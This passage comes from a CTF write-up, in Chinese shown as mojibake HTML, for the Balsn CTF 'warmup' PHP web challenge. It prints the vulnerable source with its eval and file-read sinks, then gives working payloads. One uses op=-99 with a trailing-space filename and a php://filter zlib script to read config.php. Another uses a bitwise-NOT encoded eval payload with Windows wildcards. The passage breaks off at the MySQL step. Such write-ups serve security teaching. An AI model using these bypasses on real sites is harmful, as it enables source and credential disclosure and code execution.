å‘ç°éå¸¸çš„éš¾è¯»ï¼Œæˆ‘ä»¬éœ€è¦é‡æ„ä¸€ä¸‹ã€‚"><a href="#åˆšå¼€å§‹æ‹¿åˆ°æºç å‘ç°éå¸¸çš„éš¾è¯»ï¼Œæˆ‘ä»¬éœ€è¦é‡æ„ä¸€ä¸‹ã€‚" class="headerlink" title="åˆšå¼€å§‹æ‹¿åˆ°æºç å‘ç°éå¸¸çš„éš¾è¯»ï¼Œæˆ‘ä»¬éœ€è¦é‡æ„ä¸€ä¸‹ã€‚"></a>åˆšå¼€å§‹æ‹¿åˆ°æºç å‘ç°éå¸¸çš„éš¾è¯»ï¼Œæˆ‘ä»¬éœ€è¦é‡æ„ä¸€ä¸‹ã€‚</h5><h5 id="ä¸‹é¢æ˜¯é‡æ„åçš„æºç ï¼š"><a href="#ä¸‹é¢æ˜¯é‡æ„åçš„æºç ï¼š" class="headerlink" title="ä¸‹é¢æ˜¯é‡æ„åçš„æºç ï¼š"></a>ä¸‹é¢æ˜¯é‡æ„åçš„æºç ï¼š</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// This is the meme image location</span></span><br><span class="line">    $secret = base64_decode(str_rot13(<span class="string">"CTygMlOmpz"</span>.<span class="string">"Z9VaSkYzcjMJpvCt=="</span>));</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    </span><br><span class="line">    $op = @$_GET[<span class="string">'op'</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(@strlen($op) &lt; <span class="number">3</span> &amp;&amp; @($op + <span class="number">8</span>) &lt; <span class="string">'A_A'</span>) &#123;</span><br><span class="line">    </span><br><span class="line">        $_ = @$_GET[<span class="string">'Î£&gt;â€•(#Â°Ï‰Â°#)â™¡â†’'</span>];</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>( preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>,$_) || @strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> || @strlen($_) &gt; <span class="number">19</span> )</span><br><span class="line">            <span class="keyword">exit</span>($secret);</span><br><span class="line">        </span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        @curl_setopt($ch, CURLOPT_URL, </span><br><span class="line">                str_replace(<span class="string">"%33%33%61"</span>, <span class="string">"&gt;__&lt;"</span>, </span><br><span class="line">                str_replace(<span class="string">"%63%3a"</span>, <span class="string">"WTF"</span>, str_replace(<span class="string">"633a"</span>, <span class="string">":)"</span>, </span><br><span class="line">                str_repLace(<span class="string">"433a"</span>, <span class="string">":("</span>, </span><br><span class="line">                str_replace(<span class="string">"\x63:"</span>, <span class="string">"ggininder"</span>, </span><br><span class="line">                strtolower(</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="string">"return $_;"</span>)</span><br><span class="line">                ))))))</span><br><span class="line">        );</span><br><span class="line">        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        @curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">1</span>);</span><br><span class="line">        @curl_EXEC($ch);</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(@stRLEn($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="comment">// There is a invisible character here. (\xe2\x81\xa3)</span></span><br><span class="line">            $_ = @$_GET[<span class="string">'â£'</span>];</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>) || </span><br><span class="line">               (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>) || </span><br><span class="line">               (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>) || </span><br><span class="line">               (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>) || </span><br><span class="line">               (stripos($_,<span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>) || </span><br><span class="line">               (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">                    <span class="keyword">die</span>($secret);</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(stripos($_, <span class="string">".."</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            </span><br><span class="line">            print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// It is useless, because there is a die function before it. :D</span></span><br><span class="line">            system($_GET[<span class="number">0x9487945</span>]);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2"></a>step 2</h5><h5 id="æˆ‘ä»¬ç°åœ¨åˆå§‹å»è¯»å–config-php"><a href="#æˆ‘ä»¬ç°åœ¨åˆå§‹å»è¯»å–config-php" class="headerlink" title="æˆ‘ä»¬ç°åœ¨åˆå§‹å»è¯»å–config.php"></a>æˆ‘ä»¬ç°åœ¨åˆå§‹å»è¯»å–<code>config.php</code></h5><h5 id="æœ‰ä¸¤ä¸ªæ–¹å¼å¯ä»¥å»ç”¨ï¼š"><a href="#æœ‰ä¸¤ä¸ªæ–¹å¼å¯ä»¥å»ç”¨ï¼š" class="headerlink" title="æœ‰ä¸¤ä¸ªæ–¹å¼å¯ä»¥å»ç”¨ï¼š"></a>æœ‰ä¸¤ä¸ªæ–¹å¼å¯ä»¥å»ç”¨ï¼š</h5><h5 id="1-ä½¿ç”¨file-get-contents-é¢„æœŸ"><a href="#1-ä½¿ç”¨file-get-contents-é¢„æœŸ" class="headerlink" title="1.ä½¿ç”¨file_get_contents()(é¢„æœŸ)"></a>1.ä½¿ç”¨<code>file_get_contents()</code>(é¢„æœŸ)</h5><h5 id="2-ä½¿ç”¨eval-éé¢„æœŸ"><a href="#2-ä½¿ç”¨eval-éé¢„æœŸ" class="headerlink" title="2.ä½¿ç”¨eval()(éé¢„æœŸ)"></a>2.ä½¿ç”¨<code>eval()</code>(éé¢„æœŸ)</h5><h5 id="æ–¹æ³•-0x1"><a href="#æ–¹æ³•-0x1" class="headerlink" title="æ–¹æ³• 0x1"></a>æ–¹æ³• 0x1</h5><h5 id="if-stRLEn-op-lt-4-amp-amp-op-78-lt-39-A-A-39"><a href="#if-stRLEn-op-lt-4-amp-amp-op-78-lt-39-A-A-39" class="headerlink" title="if(@stRLEn($op) &lt; 4 &amp;&amp; @($op + 78) &lt; &#39;A__A&#39;)"></a><code>if(@stRLEn($op) &lt; 4 &amp;&amp; @($op + 78) &lt; &#39;A__A&#39;)</code></h5><h5 id="å¯¹äºè¿™æ®µä»£ç æˆ‘ä»¬å¯ä»¥ç”¨op-99æ¥ç»•è¿‡ã€‚"><a href="#å¯¹äºè¿™æ®µä»£ç æˆ‘ä»¬å¯ä»¥ç”¨op-99æ¥ç»•è¿‡ã€‚" class="headerlink" title="å¯¹äºè¿™æ®µä»£ç æˆ‘ä»¬å¯ä»¥ç”¨op=-99æ¥ç»•è¿‡ã€‚"></a>å¯¹äºè¿™æ®µä»£ç æˆ‘ä»¬å¯ä»¥ç”¨<code>op=-99</code>æ¥ç»•è¿‡ã€‚</h5><h5 id="ä¹‹åæˆ‘ä»¬å¯ä»¥è¾“å…¥æˆ‘ä»¬çš„æ–‡ä»¶ååˆ°file-get-contents"><a href="#ä¹‹åæˆ‘ä»¬å¯ä»¥è¾“å…¥æˆ‘ä»¬çš„æ–‡ä»¶ååˆ°file-get-contents" class="headerlink" title="ä¹‹åæˆ‘ä»¬å¯ä»¥è¾“å…¥æˆ‘ä»¬çš„æ–‡ä»¶ååˆ°file_get_contents():"></a>ä¹‹åæˆ‘ä»¬å¯ä»¥è¾“å…¥æˆ‘ä»¬çš„æ–‡ä»¶ååˆ°<code>file_get_contents()</code>:</h5><h5 id="GET-39-39"><a href="#GET-39-39" class="headerlink" title="$_GET[&#39;&#39;];"></a><code>$_GET[&#39;&#39;];</code></h5><h5 id="è¿™ä¸ªå‚æ•°-GETçš„å‚æ•°æ˜¯-xE2-x81-xA3ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ã€‚"><a href="#è¿™ä¸ªå‚æ•°-GETçš„å‚æ•°æ˜¯-xE2-x81-xA3ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ã€‚" class="headerlink" title="è¿™ä¸ªå‚æ•°$_GETçš„å‚æ•°æ˜¯\xE2\x81\xA3ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ã€‚"></a>è¿™ä¸ªå‚æ•°<code>$_GET</code>çš„å‚æ•°æ˜¯<code>\xE2\x81\xA3</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ã€‚</h5><h5 id="æˆ‘ä»¬çš„ç›®çš„æ˜¯å»é˜…è¯»config-phpï¼Œä½†æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„ä¸€äº›æ–‡ä»¶åæœ‰æ£€æŸ¥ã€‚"><a href="#æˆ‘ä»¬çš„ç›®çš„æ˜¯å»é˜…è¯»config-phpï¼Œä½†æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„ä¸€äº›æ–‡ä»¶åæœ‰æ£€æŸ¥ã€‚" class="headerlink" title="æˆ‘ä»¬çš„ç›®çš„æ˜¯å»é˜…è¯»config.phpï¼Œä½†æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„ä¸€äº›æ–‡ä»¶åæœ‰æ£€æŸ¥ã€‚"></a>æˆ‘ä»¬çš„ç›®çš„æ˜¯å»é˜…è¯»<code>config.php</code>ï¼Œä½†æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„ä¸€äº›æ–‡ä»¶åæœ‰æ£€æŸ¥ã€‚</h5><h5 id="æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨-phpï¼Œphp-çš„æ–‡ä»¶ååç¼€å¹¶ä¸”æˆ‘ä»¬çš„æ–‡ä»¶åä¸èƒ½åŒ…å«-quot-gt-lt-amp-ã€‚"><a href="#æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨-phpï¼Œphp-çš„æ–‡ä»¶ååç¼€å¹¶ä¸”æˆ‘ä»¬çš„æ–‡ä»¶åä¸èƒ½åŒ…å«-quot-gt-lt-amp-ã€‚" class="headerlink" title="æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨.phpï¼Œphp.çš„æ–‡ä»¶ååç¼€å¹¶ä¸”æˆ‘ä»¬çš„æ–‡ä»¶åä¸èƒ½åŒ…å«&quot;,&gt;,&lt;,amp,$,..ã€‚"></a>æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨<code>.php</code>ï¼Œ<code>php.</code>çš„æ–‡ä»¶ååç¼€å¹¶ä¸”æˆ‘ä»¬çš„æ–‡ä»¶åä¸èƒ½åŒ…å«<code>&quot;</code>,<code>&gt;</code>,<code>&lt;</code>,<code>amp</code>,<code>$</code>,<code>..</code>ã€‚</h5><h5 id="ä¸ºäº†å»ç»•è¿‡è¿™ä¸ªé™åˆ¶å»é˜…è¯»phpæºä»£ç ï¼Œä½ ä»…ä»…éœ€è¦å»æ·»åŠ ä¸€ä¸ªç©ºæ ¼-20-ï¼š"><a href="#ä¸ºäº†å»ç»•è¿‡è¿™ä¸ªé™åˆ¶å»é˜…è¯»phpæºä»£ç ï¼Œä½ ä»…ä»…éœ€è¦å»æ·»åŠ ä¸€ä¸ªç©ºæ ¼-20-ï¼š" class="headerlink" title="ä¸ºäº†å»ç»•è¿‡è¿™ä¸ªé™åˆ¶å»é˜…è¯»phpæºä»£ç ï¼Œä½ ä»…ä»…éœ€è¦å»æ·»åŠ ä¸€ä¸ªç©ºæ ¼(%20)ï¼š"></a>ä¸ºäº†å»ç»•è¿‡è¿™ä¸ªé™åˆ¶å»é˜…è¯»phpæºä»£ç ï¼Œä½ ä»…ä»…éœ€è¦å»æ·»åŠ ä¸€ä¸ªç©ºæ ¼(%20)ï¼š</h5><h5 id="config-php-SPACE"><a href="#config-php-SPACE" class="headerlink" title="config.php[SPACE]"></a><code>config.php[SPACE]</code></h5><h5 id="Because-the-server-is-running-on-Windows-there-are-some-weird-path-normalization-rule-here-p"><a href="#Because-the-server-is-running-on-Windows-there-are-some-weird-path-normalization-rule-here-p" class="headerlink" title="(Because the server is running on Windows, there are some weird path normalization rule here :p)"></a>(Because the server is running on Windows, there are some weird path normalization rule here :p)</h5><h5 id="ä½ å¦‚æœå°è¯•å»è¯»å–æºä»£ç config-phpä½¿ç”¨å¦‚ä¸‹payload"><a href="#ä½ å¦‚æœå°è¯•å»è¯»å–æºä»£ç config-phpä½¿ç”¨å¦‚ä¸‹payload" class="headerlink" title="ä½ å¦‚æœå°è¯•å»è¯»å–æºä»£ç config.phpä½¿ç”¨å¦‚ä¸‹payload:"></a>ä½ å¦‚æœå°è¯•å»è¯»å–æºä»£ç <code>config.php</code>ä½¿ç”¨å¦‚ä¸‹payload:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=config.php%20</span><br></pre></td></tr></table></figure>

<h5 id="ä½ å°†ä¼šå¾—åˆ°config-phpçš„å†…å®¹ã€‚"><a href="#ä½ å°†ä¼šå¾—åˆ°config-phpçš„å†…å®¹ã€‚" class="headerlink" title="ä½ å°†ä¼šå¾—åˆ°config.phpçš„å†…å®¹ã€‚"></a>ä½ å°†ä¼šå¾—åˆ°<code>config.php</code>çš„å†…å®¹ã€‚</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // ***********************************</span><br><span class="line">    // THIS IS THE CONFIG OF THE MYSQL DB</span><br><span class="line">    // ***********************************</span><br><span class="line">    $host = &quot;loca</span><br></pre></td></tr></table></figure>

<h5 id="å› ä¸ºfile-get-contents-çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯155ã€‚"><a href="#å› ä¸ºfile-get-contents-çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯155ã€‚" class="headerlink" title="å› ä¸ºfile_get_contents()çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯155ã€‚"></a>å› ä¸º<code>file_get_contents()</code>çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯155ã€‚</h5><h5 id="æˆ‘ä»¬åº”è¯¥ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„phpåŒ…è£…å™¨æ¥è§£å‹ç¼©config-phpçš„å†…å®¹ã€‚"><a href="#æˆ‘ä»¬åº”è¯¥ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„phpåŒ…è£…å™¨æ¥è§£å‹ç¼©config-phpçš„å†…å®¹ã€‚" class="headerlink" title="æˆ‘ä»¬åº”è¯¥ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„phpåŒ…è£…å™¨æ¥è§£å‹ç¼©config.phpçš„å†…å®¹ã€‚"></a>æˆ‘ä»¬åº”è¯¥ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„phpåŒ…è£…å™¨æ¥è§£å‹ç¼©<code>config.php</code>çš„å†…å®¹ã€‚</h5><h5 id="å› æ­¤php-filter-zlib-deflateæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚"><a href="#å› æ­¤php-filter-zlib-deflateæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚" class="headerlink" title="å› æ­¤php://filter/zlib.deflateæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚"></a>å› æ­¤<code>php://filter/zlib.deflate</code>æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚</h5><h5 id="ä½¿ç”¨zlib-deflateå‹ç¼©å†…å®¹ï¼Œç„¶åä½¿ç”¨zlib-inflateè§£å‹ç¼©å†…å®¹ã€‚"><a href="#ä½¿ç”¨zlib-deflateå‹ç¼©å†…å®¹ï¼Œç„¶åä½¿ç”¨zlib-inflateè§£å‹ç¼©å†…å®¹ã€‚" class="headerlink" title="ä½¿ç”¨zlib.deflateå‹ç¼©å†…å®¹ï¼Œç„¶åä½¿ç”¨zlib.inflateè§£å‹ç¼©å†…å®¹ã€‚"></a>ä½¿ç”¨<code>zlib.deflate</code>å‹ç¼©å†…å®¹ï¼Œç„¶åä½¿ç”¨<code>zlib.inflate</code>è§£å‹ç¼©å†…å®¹ã€‚</h5><h5 id="è„šæœ¬å¦‚ä¸‹ï¼š"><a href="#è„šæœ¬å¦‚ä¸‹ï¼š" class="headerlink" title="è„šæœ¬å¦‚ä¸‹ï¼š"></a>è„šæœ¬å¦‚ä¸‹ï¼š</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">$a = file_get_contents(<span class="string">"http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20"</span>);</span><br><span class="line">$idx=strpos($a,<span class="string">"&lt;/code&gt;"</span>)+<span class="number">7</span>;</span><br><span class="line">file_put_contents(<span class="string">"./tmp/tmp"</span>,substr($a,$idx));</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.inflate/resource=./tmp/tmp"</span>);</span><br></pre></td></tr></table></figure>

<h5 id="ä½ å°†ä¼šçœ‹è§config-phpçš„å†…å®¹ã€‚"><a href="#ä½ å°†ä¼šçœ‹è§config-phpçš„å†…å®¹ã€‚" class="headerlink" title="ä½ å°†ä¼šçœ‹è§config.phpçš„å†…å®¹ã€‚"></a>ä½ å°†ä¼šçœ‹è§<code>config.php</code>çš„å†…å®¹ã€‚</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    <span class="comment">// THIS IS THE CONFIG OF THE MYSQL DB</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    $host = <span class="string">"localhost"</span>;</span><br><span class="line">    $user = <span class="string">"admin"</span>;</span><br><span class="line">    $pass = <span class="string">""</span>;</span><br><span class="line">    $port = <span class="number">8787</span>;</span><br><span class="line">    <span class="comment">// hint:flag-is-in-the-database XDDDDDDD</span></span><br><span class="line">    <span class="comment">// ====================================</span></span><br></pre></td></tr></table></figure>

<h5 id="æ–¹æ³•-0x2"><a href="#æ–¹æ³•-0x2" class="headerlink" title="æ–¹æ³• 0x2"></a>æ–¹æ³• 0x2</h5><h5 id="æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨eval-æ¥è¯»å–config-phpã€‚"><a href="#æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨eval-æ¥è¯»å–config-phpã€‚" class="headerlink" title="æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨eval()æ¥è¯»å–config.phpã€‚"></a>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<code>eval()</code>æ¥è¯»å–<code>config.php</code>ã€‚</h5><h5 id="åœ¨è¿™ä¸ªeval-å‡½æ•°ä¸­ï¼Œä½ è¾“å…¥çš„-å°†ä¼šæ”¾åˆ°eval-quot-return-quot-ã€‚"><a href="#åœ¨è¿™ä¸ªeval-å‡½æ•°ä¸­ï¼Œä½ è¾“å…¥çš„-å°†ä¼šæ”¾åˆ°eval-quot-return-quot-ã€‚" class="headerlink" title="åœ¨è¿™ä¸ªeval()å‡½æ•°ä¸­ï¼Œä½ è¾“å…¥çš„$_å°†ä¼šæ”¾åˆ°eval(&quot;return $_;&quot;)ã€‚"></a>åœ¨è¿™ä¸ª<code>eval()</code>å‡½æ•°ä¸­ï¼Œä½ è¾“å…¥çš„<code>$_</code>å°†ä¼šæ”¾åˆ°<code>eval(&quot;return $_;&quot;)</code>ã€‚</h5><h5 id="ä½†æ˜¯æœ‰ä¸ªä¸¥æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ§åˆ¶ï¼š"><a href="#ä½†æ˜¯æœ‰ä¸ªä¸¥æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ§åˆ¶ï¼š" class="headerlink" title="ä½†æ˜¯æœ‰ä¸ªä¸¥æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ§åˆ¶ï¼š"></a>ä½†æ˜¯æœ‰ä¸ªä¸¥æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ§åˆ¶ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if( preg_match(&apos;/[\x00-!\&apos;0-9&quot;`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i&apos;,$_) || @strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd || @strlen($_) &gt; 19 )</span><br><span class="line">    exit($secret);</span><br></pre></td></tr></table></figure>

<h5 id="ç„¶è€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨-æ¥ç»•è¿‡è®¸å¤šçš„é™åˆ¶ã€‚"><a href="#ç„¶è€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨-æ¥ç»•è¿‡è®¸å¤šçš„é™åˆ¶ã€‚" class="headerlink" title="ç„¶è€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨~æ¥ç»•è¿‡è®¸å¤šçš„é™åˆ¶ã€‚"></a>ç„¶è€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>~</code>æ¥ç»•è¿‡è®¸å¤šçš„é™åˆ¶ã€‚</h5><h5 id="ä¾‹å¦‚ï¼š-urldecode-quot-8D-9A-9E-9B-99-96-93-9A-quot-ç­‰ä»·äºreadfile"><a href="#ä¾‹å¦‚ï¼š-urldecode-quot-8D-9A-9E-9B-99-96-93-9A-quot-ç­‰ä»·äºreadfile" class="headerlink" title="ä¾‹å¦‚ï¼š~urldecode(&quot;%8D%9A%9E%9B%99%96%93%9A&quot;)ç­‰ä»·äºreadfile"></a>ä¾‹å¦‚ï¼š<code>~urldecode(&quot;%8D%9A%9E%9B%99%96%93%9A&quot;)</code>ç­‰ä»·äº<code>readfile</code></h5><h5 id="åœ¨windowsä¸­ï¼Œæœ‰ä¸€äº›MAGICé€šé…ç¬¦åŠŸèƒ½å¯ç”¨äºè·¯å¾„æ ‡å‡†åŒ–ã€‚"><a href="#åœ¨windowsä¸­ï¼Œæœ‰ä¸€äº›MAGICé€šé…ç¬¦åŠŸèƒ½å¯ç”¨äºè·¯å¾„æ ‡å‡†åŒ–ã€‚" class="headerlink" title="åœ¨windowsä¸­ï¼Œæœ‰ä¸€äº›MAGICé€šé…ç¬¦åŠŸèƒ½å¯ç”¨äºè·¯å¾„æ ‡å‡†åŒ–ã€‚"></a>åœ¨windowsä¸­ï¼Œæœ‰ä¸€äº›MAGICé€šé…ç¬¦åŠŸèƒ½å¯ç”¨äºè·¯å¾„æ ‡å‡†åŒ–ã€‚</h5><h5 id="ä¾‹å¦‚ï¼š"><a href="#ä¾‹å¦‚ï¼š" class="headerlink" title="ä¾‹å¦‚ï¼š"></a>ä¾‹å¦‚ï¼š</h5><h5 id="gt-å°†åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦ã€‚-ä¾‹å¦‚-åœ¨linuxä¸­"><a href="#gt-å°†åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦ã€‚-ä¾‹å¦‚-åœ¨linuxä¸­" class="headerlink" title="&gt;å°†åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦ã€‚(ä¾‹å¦‚?åœ¨linuxä¸­)"></a><code>&gt;</code>å°†åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦ã€‚(ä¾‹å¦‚<code>?</code>åœ¨linuxä¸­)</h5><h5 id="lt-å°†åŒ¹é…é›¶ä¸ªæˆ–è€…å¤šä¸ªä»»æ„å­—ç¬¦ã€‚-ä¾‹å¦‚-åœ¨linuxä¸­"><a href="#lt-å°†åŒ¹é…é›¶ä¸ªæˆ–è€…å¤šä¸ªä»»æ„å­—ç¬¦ã€‚-ä¾‹å¦‚-åœ¨linuxä¸­" class="headerlink" title="&lt;å°†åŒ¹é…é›¶ä¸ªæˆ–è€…å¤šä¸ªä»»æ„å­—ç¬¦ã€‚(ä¾‹å¦‚*åœ¨linuxä¸­)"></a><code>&lt;</code>å°†åŒ¹é…é›¶ä¸ªæˆ–è€…å¤šä¸ªä»»æ„å­—ç¬¦ã€‚(ä¾‹å¦‚<code>*</code>åœ¨linuxä¸­)</h5><h5 id="ç»“åˆ-æŠ€å·§å’Œ-lt-æŠ€å·§ï¼š"><a href="#ç»“åˆ-æŠ€å·§å’Œ-lt-æŠ€å·§ï¼š" class="headerlink" title="ç»“åˆ~æŠ€å·§å’Œ&lt;æŠ€å·§ï¼š"></a>ç»“åˆ<code>~</code>æŠ€å·§å’Œ<code>&lt;</code>æŠ€å·§ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?op=-9&amp;Î£&gt;â€•(%23Â°Ï‰Â°%23)â™¡â†’=(~%8D%9A%9E%9B%99%96%93%9A)(~%9C%90%C3%C3)</span><br></pre></td></tr></table></figure>

<h5 id="ä¸readfile-quot-co-lt-lt-quot-ç›¸åŒ"><a href="#ä¸readfile-quot-co-lt-lt-quot-ç›¸åŒ" class="headerlink" title="(ä¸readfile(&quot;co&lt;&lt;&quot;)ç›¸åŒ)"></a>(ä¸<code>readfile(&quot;co&lt;&lt;&quot;)</code>ç›¸åŒ)</h5><h5 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h5><h5 id="config-phpçš„å†…å®¹å‘Šè¯‰æˆ‘ä»¬flagæ˜¯åœ¨MySQL-æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯å»æŸ¥è¯¢MySQL-Serverå¹¶ä¸”è·å–ç»“æœã€‚"><a href="#config-phpçš„å†…å®¹å‘Šè¯‰æˆ‘ä»¬flagæ˜¯åœ¨MySQL-æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯å»æŸ¥è¯¢MySQL-Serverå¹¶ä¸”è·å–ç»“æœã€‚" class="headerlink" title="config.phpçš„å†…å®¹å‘Šè¯‰æˆ‘ä»¬flagæ˜¯åœ¨MySQL æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯å»æŸ¥è¯¢MySQL 